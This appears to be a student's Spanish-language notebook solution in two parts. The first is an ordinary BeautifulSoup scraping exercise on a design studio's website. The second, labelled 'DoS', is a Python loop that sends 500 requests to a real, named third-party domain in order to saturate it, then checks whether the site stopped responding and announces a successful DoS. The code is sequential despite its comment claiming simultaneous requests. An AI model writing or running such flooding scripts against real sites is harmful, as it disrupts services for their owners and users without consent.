# Mi solución

## Tarea 1 (Web scraping)

#### imports

```python
from bs4 import BeautifulSoup as bs
import requests as rq
import json
from urllib.parse import urljoin
from IPython.display import display, Markdown
```

### Primera web

#### URL de la primera web

```python
url1 = "https://www.dacreativedesign.com/"
print(f"web escogida {url1}")
```

#### Comprobar que la web está activa

```python
# comprobar que la web acepta peticiones
respuesta = rq.get(url1)

if respuesta.ok:
    print("La web está activa:", respuesta.status_code)
else:
    print("La web no está activa:", respuesta.status_code)
```

#### crear el objeto soup

```python
# creamos el objeto soup para parsear el contenido HTML
soup1 = bs(respuesta.text, "html.parser")
print("Objeto soup creado correctamente")
print(f"Tipo: {type(soup1)}")
```

#### Obtener el contenido textual y exportarlo a JSON

```python
# obtenemos todo el contenido textual de la página
contenido_text = soup1.get_text(separator='\n').strip()

# Limpiamos líneas vacías
lineas = [linea.strip() for linea in contenido_text.splitlines() if linea.strip()]
text_net = '\n'.join(lineas)

# exportamos el contenido a un fichero JSON
datos = {
    "url": url1,
    "contenido_textual": lineas
}

with open("contenido_web1.json", "w") as archivo:
    json.dump(datos, archivo, indent=4)

print("Contenido textual exportado a contenido_web1.json")
print(f"Total de líneas de texto obtenidas: {len(lineas)}")
print("\nPrevisualización (primeras 10 líneas):")
for linea in lineas[:10]:
    print(linea)
```

#### Obtener el tag `<title>`

```python
# Obtenemos el titulo de la web
titulo = soup1.title.string if soup1.title else "No encontrado"
print(f"Titulo de la web: {titulo}")
```

#### Obtener los metadatos

```python
# Obtenemos los metadatos de la pagina
metadatos = {
    "author": None,
    "keywords": None,
    "description": None
}

for meta in soup1.find_all("meta"):
  nombre = meta.get("name", "").lower()
  if nombre == "author":
    metadatos["author"] = meta.get("content")
  elif nombre == "keywords":
    metadatos["keywords"] = meta.get("content")
  elif nombre == "description":
    metadatos["description"] = meta.get("content")


print("Metadatos encontrados:")
for clave, valor in metadatos.items():
    print(f"{clave}: {valor}")
```

#### Obtener imágenes

```python
# contamos cuantas imagenes hay
imagenes = soup1.find_all("img")
print(f"Total de imagenes encontradas: {len(imagenes)}")

# Obtenemos todas las rutas absolutas
rutas_absolutas = []
for img in imagenes:
  src = img.get("src", "")
  if src:
    ruta_absoluta = urljoin(url1, src)
    rutas_absolutas.append(ruta_absoluta)

print("\nListado de todas las rutas absolutas de la imagen:")
for i, ruta in enumerate(rutas_absolutas, 1):
  print(f"{i}. {ruta}")
```

#### Mostramos 3 imágenes

```python
for i, ruta in enumerate(rutas_absolutas[:3], 1):
  display(Markdown(f"Imagen {i}:"))
  display(Markdown(f"![]({ruta})"))
```

#### contenido textual de divs


```python
# Buscamos todas las clases CSS disponibles en la web para elegir una
todas_clases = set()
for tag in soup1.find_all(True):
    clases = tag.get("class", [])
    for clase in clases:
        todas_clases.add(clase)

print("Clases CSS encontradas en la web:")
for clase in sorted(todas_clases):
    print(f" - {clase}")
```

```python
# Obtenemos el contenido textual de todos los tag <div> con una clase CSS
# Podemos cambiar 'clase_css' por cualquier clase encontrada en la web
clase_css = "wixui-rich-text"
divs = soup1.find_all("div", class_=clase_css)

print(f"Numero de div class={clase_css} encontrados: {len(divs)}")
print("\nContenido textual de cada uno:")
for i, div in enumerate(divs, 1):
   text = div.get_text(separator="").strip()
   text_net = " ".join(text.split()) # eliminamos espacios multiples
   print(f"\nDiv {i}:")
   print(text_net[:300]) # Mostramos los primeros 300 caracteres
```

## Tarea 2 (DoS)

### Imports

```python
import requests as rq
import time
```

### URL de la web

```python
url_dos = "http://rai.cat/"

# Comprobamos que la web está activa antes de empezar
respuesta = rq.get(url_dos)
print(f"Estado inicial de la web: {respuesta.status_code}")
print(f"Web activa: {respuesta.ok}")
```

### Lanzar el DoS y registrar respuesta

```python
# Lanzamos múltiples peticiones simultáneas para saturar el servidor
# Registramos el código de respuesta de cada petición

resultados = []
num_peticiones = 500 # numero de peticiones

print(f"Lanzado {num_peticiones} peticiones a {url_dos}")

for i in range(num_peticiones):
  try:
    respuesta = rq.get(url_dos, timeout=5)
    resultados.append(respuesta.status_code)
    print(f"Peticion {i+1}: status {respuesta.status_code}")
  except Exception as e:
    resultados.append("Error")
    print(f"Peticiones {i+1}: Error - {e}")
```

### Resumen de resultados

```python
# Mostramos un resumen de los resultados
total = len(resultados)
exitosas = resultados.count(200)
fallidas = resultados.count("Error")
otros = total - exitosas - fallidas

print(f"Total de peticiones lanzadas: {total}")
print(f"Peticiones exitosas (200):    {exitosas}")
print(f"Peticiones fallidas (Error):  {fallidas}")
print(f"Otras respuestas:             {otros}")

# comprobamos el estado final de la web
try:
  respuesta_final = rq.get(url_dos, timeout=5)
  print(f"\nEstado final de la web: {respuesta_final.status_code}")
except Exception as e:
  print(f"\nEstado final de la web: Error - {e}")
  print("La web no responde - ¡¡¡DoS Exitoso!!!")
```
